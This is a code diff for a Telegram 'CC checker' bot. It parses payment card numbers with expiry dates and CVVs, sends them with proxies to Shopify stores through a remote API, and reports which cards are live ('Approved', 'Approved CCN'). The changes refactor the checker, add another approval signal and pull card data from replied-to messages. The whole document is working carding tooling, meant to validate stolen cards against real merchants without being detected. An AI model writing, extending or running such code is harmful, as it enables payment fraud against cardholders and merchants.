@@ -18,7 +18,7 @@ logger = logging.getLogger("sh")
 BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'
 
 # ==============================
-# CONFIG - NUEVA API
+# CONFIG
 # ==============================
 
 API_URL = "https://shopi-production-7ef9.up.railway.app/"
@@ -27,16 +27,14 @@ CONNECT_TIMEOUT = 20
 
 CC_REGEX = r'(\d{14,16})[:,.;/\\|\s]+(\d{1,2})[:,.;/\\|\s]+(\d{2,4})[:,.;/\\|\s]+(\d{3,4})'
 
-# ==============================
-# CONCURRENCIA PERSONAL
-# ==============================
-
 busy_users = {}
 
+# ==============================
+# LIMITES
+# ==============================
+
 def get_limit(uid: int) -> int:
-    if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid):
-        return 4
-    return 2
+    return 4 if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid) else 2
 
 def can_run(uid: int) -> bool:
     return busy_users.get(uid, 0) < get_limit(uid)
@@ -48,13 +46,13 @@ def mark_end(uid: int):
     if uid in busy_users:
         busy_users[uid] -= 1
         if busy_users[uid] <= 0:
-            del busy_users[uid]
+            busy_users.pop(uid, None)
 
 # ==============================
 # HELPERS
 # ==============================
 
-def extract_card(text):
+def extract_card(text: str):
     m = re.search(CC_REGEX, text)
     if not m:
         return None
@@ -70,18 +68,18 @@ def build_cc(c):
     year = f"20{c['year']}" if int(c["year"]) <= 50 else f"19{c['year']}"
     return f"{c['number']}|{c['month']}|{year}|{c['cvv']}"
 
-def format_site(site: str) -> str:
+def format_site(site):
     return site if site.startswith("http") else f"https://{site}"
 
-def format_proxy(proxy: str) -> str:
+def format_proxy(proxy):
     return proxy if proxy.count(":") >= 3 else f"{proxy}:user:pass"
 
-def get_bin(card_number: str):
+def get_bin(card_number):
     from bin import get_bin_info
     return get_bin_info(card_number[:6])
 
 # ==============================
-# STATUS POR RESPONSE (FINAL)
+# STATUS
 # ==============================
 
 def status_from_response(resp: str) -> str:
@@ -90,42 +88,25 @@ def status_from_response(resp: str) -> str:
 
     r = resp.upper().replace(" ", "_")
 
-    APPROVED = [
-        "3D_AUTHENTICATION",
-        "INSUFFICIENT_FUNDS",
-        "INCORRECT_ZIP",
-        "ORDER_COMPLETED",
-        "ORDER_PLACED",
-        "THANK_YOU"
-    ]
-
-    APPROVED_CCN = [
-        "INCORRECT_CVC",
-        "INVALID_CVC"
-    ]
-
-    DECLINED = [
-        "CARD_DECLINED",
-        "GENERIC_ERROR",
-        "INCORRECT_NUMBER",
-        "PROCESSING_ERROR",
-        "FRAUD_SUSPECTED",
-        "RISKY"
-    ]
-
-    if any(x in r for x in APPROVED):
+    if any(x in r for x in (
+        "3D_AUTHENTICATION", "OTP_REQUIRED", "INSUFFICIENT_FUNDS",
+        "INCORRECT_ZIP", "ORDER_COMPLETED", "ORDER_PLACED", "THANK_YOU"
+    )):
         return "Approved ✅"
 
-    if any(x in r for x in APPROVED_CCN):
+    if any(x in r for x in ("INCORRECT_CVC", "INVALID_CVC")):
         return "Approved CCN ✅"
 
-    if any(x in r for x in DECLINED):
+    if any(x in r for x in (
+        "CARD_DECLINED", "GENERIC_ERROR", "INCORRECT_NUMBER",
+        "PROCESSING_ERROR", "FRAUD_SUSPECTED", "RISKY"
+    )):
         return "Declined ❌"
 
     return "Error ⚠️"
 
 # ==============================
-# API CALL - NUEVA IMPLEMENTACIÓN
+# API CALL
 # ==============================
 
 async def check_shopify(card, site, proxy):
@@ -135,32 +116,27 @@ async def check_shopify(card, site, proxy):
         "proxy": format_proxy(proxy)
     }
 
-    timeout = aiohttp.ClientTimeout(
-        total=REQUEST_TIMEOUT,
-        connect=CONNECT_TIMEOUT
-    )
+    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
 
     try:
         async with aiohttp.ClientSession(timeout=timeout) as s:
             async with s.get(API_URL, params=params) as r:
-                if r.status == 200:
-                    data = await r.json()
-                    return (
-                        data.get("Gate", "Normal"),
-                        data.get("Price", "0"),
-                        data.get("Response", "N/A")
-                    )
-                else:
-                    return "Normal", "0", f"HTTP {r.status}"
+                if r.status != 200:
+                    return "Normal", "0", f"HTTP_{r.status}"
+
+                data = await r.json()
+                return (
+                    data.get("Gate", "Normal"),
+                    data.get("Price", "0"),
+                    data.get("Response", "N/A")
+                )
     except asyncio.TimeoutError:
         return "Normal", "0", "TIMEOUT"
-    except aiohttp.ClientError as e:
-        return "Normal", "0", f"CONN_ERR: {str(e)[:40]}"
     except Exception as e:
         return "Normal", "0", str(e)[:60]
 
 # ==============================
-# FORMATO FINAL (COPIABLE)
+# FORMATO FINAL
 # ==============================
 
 def format_result(gateway, price, cc, status, response, bininfo, site_i, proxy_i, t, user):
@@ -177,10 +153,8 @@ def format_result(gateway, price, cc, status, response, bininfo, site_i, proxy_i
         f"{BOT_TAG} <b>Bank:</b> <code>{bininfo['bank']}</code>\n"
         f"{BOT_TAG} <b>Country:</b> <code>{bininfo['country']}</code>\n"
         "━━━━━━━━━━━━━━━━\n"
-        f"{BOT_TAG} <b>Site:</b> {site_i}\n"
-        f"{BOT_TAG} <b>Proxy:</b> {proxy_i}\n"
+        f"{BOT_TAG} <b>Site:</b> {site_i} | <b>Proxy:</b> {proxy_i}\n"
         f"{BOT_TAG} <b>Time:</b> {t:.2f}s\n"
-        "━━━━━━━━━━━━━━━━\n"
         f"{BOT_TAG} <b>Req by:</b> @{user}"
     )
 
@@ -197,40 +171,28 @@ async def handle_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if not can_run(uid):
-        await msg.reply_text(
-            "⏳ Límite de verificaciones simultáneas alcanzado.",
-            reply_to_message_id=msg.message_id
-        )
+        await msg.reply_text("⏳ Límite de verificaciones simultáneas alcanzado.", reply_to_message_id=msg.message_id)
         return
 
     if not db.get_user(uid):
-        await msg.reply_text(
-            "❌ Debes registrarte primero.",
-            reply_to_message_id=msg.message_id
-        )
+        await msg.reply_text("❌ Debes registrarte primero.", reply_to_message_id=msg.message_id)
         return
 
     sites = db.get_user_shopify_sites(uid)
     proxies = db.get_user_proxies(uid)
 
     if not sites or not proxies:
-        await msg.reply_text(
-            "❌ Necesitas sitios Shopify y proxies.",
-            reply_to_message_id=msg.message_id
-        )
+        await msg.reply_text("❌ Necesitas sitios Shopify y proxies.", reply_to_message_id=msg.message_id)
         return
 
-    if len(msg.text.split(maxsplit=1)) < 2:
-        await msg.reply_text(
-            "⚠️ Uso: <code>/sh n|mm|yy|cvv</code>",
-            parse_mode="HTML",
-            reply_to_message_id=msg.message_id
-        )
-        return
+    # 👉 AQUÍ ESTÁ LA MAGIA (mensaje + reply)
+    text = msg.text or ""
+    if msg.reply_to_message and msg.reply_to_message.text:
+        text += "\n" + msg.reply_to_message.text
 
-    card = extract_card(msg.text)
+    card = extract_card(text)
     if not card:
-        await msg.reply_text("❌ Formato de tarjeta inválido.", reply_to_message_id=msg.message_id)
+        await msg.reply_text("❌ No se detectó una CC válida.", reply_to_message_id=msg.message_id)
         return
 
     mark_start(uid)
@@ -241,15 +203,10 @@ async def handle_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     proxy_i = random.randrange(len(proxies))
 
     try:
-        gateway, price, response = await check_shopify(
-            card,
-            sites[site_i],
-            proxies[proxy_i]
-        )
-
+        gateway, price, response = await check_shopify(card, sites[site_i], proxies[proxy_i])
         elapsed = time.time() - start
-        bininfo = get_bin(card["number"])
         status = status_from_response(response)
+        bininfo = get_bin(card["number"])
 
         await processing.edit_text(
             format_result(
@@ -271,18 +228,10 @@ async def handle_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         mark_end(uid)
 
 # ==============================
-# DOT
-# ==============================
-
-async def handle_dot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text.startswith(".sh"):
-        await handle_sh(update, context)
-
-# ==============================
 # REGISTER
 # ==============================
 
 def register_handlers(app):
     app.add_handler(CommandHandler("sh", handle_sh))
-    app.add_handler(MessageHandler(filters.Regex(r"^\.sh\b"), handle_dot))
-    logger.info("Handlers SH cargados con NUEVA API")
+    app.add_handler(MessageHandler(filters.Regex(r"^\.sh\b"), handle_sh))
+    logger.info("Handlers SH cargados")
